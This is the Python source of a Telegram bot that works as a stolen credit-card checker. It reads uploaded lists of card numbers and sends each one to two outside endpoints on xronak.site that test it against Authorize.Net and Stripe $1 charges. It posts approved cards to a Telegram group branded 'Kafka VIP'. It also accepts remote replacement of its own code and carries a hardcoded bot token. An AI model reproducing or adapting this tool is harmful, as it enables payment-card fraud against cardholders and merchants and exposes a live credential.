import telebot
import requests
import os
import threading
import time
import sys

# Replace with your bot token
bot_token = "7401990916:AAGQ_MDBQB5XDDRVODe20fzxEA39tfwsqEQ"
bot = telebot.TeleBot(bot_token)

# Replace with your Telegram group ID
group_id = -1002181497238

# Replace with your owner's Telegram ID
owner_id = 1192484969
owner_id_2 = 1469152765  # Add the new owner ID

# Path to the CC file
cc_file = "cc.txt"

# Flag to control CC checking
checking_cc = False

# Flag to indicate a restart is needed
restart_needed = False

# Variables to track bot status and CCs checked
total_ccs_checked = 0
total_ccs_checked_api2 = 0  # Track CCs checked by the second API
bot_status = "Idle"

def send_alive_message():
    try:
        bot.send_message(owner_id, "Boss, I'm alive!")
        bot.send_message(owner_id_2, "Boss, I'm alive!")  # Send to the second owner
    except Exception as e:
        print(f"Error sending alive message: {e}")
    threading.Timer(1000, send_alive_message).start()  # Schedule next message in 5 minutes

@bot.message_handler(commands=['add'])
def add_ccs(message):
    if message.from_user.id in [owner_id, owner_id_2]:  # Check both owner IDs
        bot.send_message(message.chat.id, "Send me a .txt file with CCs.")
        bot.register_next_step_handler(message, handle_file)
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")

@bot.message_handler(commands=['update'])
def handle_update(message):
    if message.from_user.id in [owner_id, owner_id_2]:  # Check both owner IDs
        bot.send_message(message.chat.id, "Send me the updated main.py file.")
        bot.register_next_step_handler(message, handle_file)
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    if message.from_user.id in [owner_id, owner_id_2]:  # Check both owner IDs
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            if message.document.file_name == "main.py":
                with open("main.py", 'w') as f:
                    f.write(downloaded_file.decode('utf-8'))
                global restart_needed
                restart_needed = True
                bot.send_message(message.chat.id, "New code received. Restarting...")
            else:
                with open(cc_file, 'a') as f:
                    f.write(downloaded_file.decode('utf-8'))
                bot.send_message(message.chat.id, "CCs added successfully!")
        except Exception as e:
            bot.send_message(owner_id, f"Error: {e}")
            bot.send_message(owner_id_2, f"Error: {e}")  # Send error to the second owner
            bot.send_message(message.chat.id, "An error occurred while adding CCs.")
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")

@bot.message_handler(commands=['clear'])
def clear_ccs(message):
    if message.from_user.id in [owner_id, owner_id_2]:  # Check both owner IDs
        try:
            os.remove(cc_file)
            bot.send_message(message.chat.id, "CCs cleared successfully!")
        except FileNotFoundError:
            bot.send_message(message.chat.id, "There are no CCs to clear.")
        except Exception as e:
            bot.send_message(owner_id, f"Error: {e}")
            bot.send_message(owner_id_2, f"Error: {e}")  # Send error to the second owner
            bot.send_message(message.chat.id, "An error occurred while clearing CCs.")
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")

@bot.message_handler(commands=['ss'])
def start_checking(message):
    global checking_cc, bot_status
    if message.from_user.id in [owner_id, owner_id_2]:  # Check both owner IDs
        checking_cc = True  # Start checking immediately
        bot_status = "Checking CCs"
        bot.send_message(message.chat.id, "Started checking CCs.")
        check_and_remove_ccs()
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")

@bot.message_handler(commands=['verify'])
def check_bot_status(message):
    if message.from_user.id in [owner_id, owner_id_2]:  # Check both owner IDs
        bot.send_message(message.chat.id, f"Bot Status: {bot_status}\nTotal CCs Checked (API 1): {total_ccs_checked}\nTotal CCs Checked (API 2): {total_ccs_checked_api2}")
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")

def check_cc(cc):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
        response = requests.get(f"https://xronak.site/apicv.php?lista={cc}", headers=headers, timeout=130) 
        result = response.text.strip()
        return result
    except requests.exceptions.ConnectionError as e:
        bot.send_message(owner_id, f"Error checking CC (API 1): {cc} - {e}")
        bot.send_message(owner_id_2, f"Error checking CC (API 1): {cc} - {e}")  # Send error to the second owner
        return None
    except Exception as e:
        bot.send_message(owner_id, f"Error checking CC (API 1): {cc} - {e}")
        bot.send_message(owner_id_2, f"Error checking CC (API 1): {cc} - {e}")  # Send error to the second owner
        return None

def check_cc_api2(cc):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
        response = requests.get(f"https://xronak.site/scrapper2.php?lista={cc}", headers=headers, timeout=130)
        result = response.text.strip()
        return result
    except requests.exceptions.ConnectionError as e:
        bot.send_message(owner_id, f"Error checking CC (API 2): {cc} - {e}")
        bot.send_message(owner_id_2, f"Error checking CC (API 2): {cc} - {e}")  # Send error to the second owner
        return None
    except Exception as e:
        bot.send_message(owner_id, f"Error checking CC (API 2): {cc} - {e}")
        bot.send_message(owner_id_2, f"Error checking CC (API 2): {cc} - {e}")  # Send error to the second owner
        return None

def check_and_remove_ccs():
    global checking_cc, total_ccs_checked, total_ccs_checked_api2, bot_status
    try:
        with open(cc_file, 'r') as f:
            ccs = f.readlines()
            for cc in ccs: 
                cc = cc.strip()
                result1 = check_cc(cc)
                # Wait for 5 seconds before checking the second API
                time.sleep(5)
                result2 = check_cc_api2(cc)
                if result1 and '✅' in result1:
                    bot.send_message(group_id, f"❀ Kafka VIP\n- - - - - - - - - - - - - - - - - - - - - - - -\n✿ CC: {cc}\n✿ Response » 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n✿ Result: {result1}\n✿⁠ GateWay » Authorize Net 1$🌥️\n- - - - - - - - - - - - - - - - - - - - - - - -\n✿ Owner » @kafkachecker")
                    total_ccs_checked += 1
                elif result2 and '✅' in result2:
                    bot.send_message(group_id, f"❀ Kafka VIP\n- - - - - - - - - - - - - - - - - - - - - - - -\n✿ CC: {cc}\n✿ Response » 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n✿ Result: {result2}\n✿⁠ GateWay » Stripe 1$⛈️\n- - - - - - - - - - - - - - - - - - - - - - - -\n✿ Owner » @kafkachecker")
                    total_ccs_checked_api2 += 1
                # Increment counters for both APIs, even if no '✅' is found
                total_ccs_checked += 1
                total_ccs_checked_api2 += 1
        # Clear the file after checking all CCs
        with open(cc_file, 'w') as f:
            f.writelines("")  # Clear the file
        checking_cc = False  # Stop checking after completion
        bot_status = "Idle"
        bot.send_message(owner_id, "CC checking completed!")
        bot.send_message(owner_id_2, "CC checking completed!")  # Send message to the second owner
    except FileNotFoundError:
        bot.send_message(owner_id, "No CCs to check.")
        bot.send_message(owner_id_2, "No CCs to check.")  # Send message to the second owner
        checking_cc = False
        bot_status = "Idle"
    except Exception as e:
        bot.send_message(owner_id, f"Error during CC checking: {e}")
        bot.send_message(owner_id_2, f"Error during CC checking: {e}")  # Send error to the second owner
        checking_cc = False
        bot_status = "Idle"

def restart_bot():
    global restart_needed
    if restart_needed:
        os.execv(__file__, sys.argv)

# ... (Rest of your existing code) ...

# Start the bot and the "I'm alive" message scheduler
send_alive_message()  # Start the initial timer

while True:
    try:
        bot.polling(none_stop=True, interval=0)  # Always keep polling
        restart_bot()
    except Exception as e:
        bot.send_message(owner_id, f"Error: {e}")
        bot.send_message(owner_id_2, f"Error: {e}")  # Send error to the second owner
        print(f"Bot restarting: {e}")
        time.sleep(5)  # Wait for 5 seconds before restarting